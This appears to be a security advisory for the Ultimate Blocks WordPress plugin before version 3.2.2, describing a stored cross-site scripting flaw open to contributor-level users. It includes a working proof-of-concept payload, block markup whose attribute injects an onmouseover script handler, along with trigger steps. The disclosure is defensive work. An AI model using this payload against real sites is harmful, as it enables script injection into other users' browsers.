## WordPress Plugin Vulnerabilities

# Ultimate Blocks < 3.2.2 - Contributor+ Stored XSS

### Description

The plugin does not validate and escape some of its block attributes before outputting them back in a page/post where the block is embed, which could allow users with the contributor role and above to perform Stored Cross-Site Scripting attacks

### Proof of Concept

Put the code below in a post while in Code Editor mode:
<!-- wp:ub/expand {"blockID":"2c04a443-500a-4bc6-9b94-b33c0ce7b29c","allowScroll":true,"scrollOption":"fixedamount","scrollOffset":44} -->\n<!-- wp:ub/expand-portion {"clickText":"show more","displayType":"partial","parentID":"2c04a443-500a-4bc6-9b94-b33c0ce7b29c","blockID":"0309a91e-81df-4953-a3af-fb2f9f6cb0f7"} /-->\n\n<!-- wp:ub/expand-portion {"clickText":"show lesss","displayType":"123\u0022onmouseover=alert(1)//","parentID":"2c04a443-500a-4bc6-9b94-b33c0ce7b29c","blockID":"72676c12-2f13-4340-a856-fffc6cac944d"} /-->\n<!-- /wp:ub/expand -->
Save/submit for review. The XSS will be triggered when (pre)viewing the post and move the mouse over the "show less" text
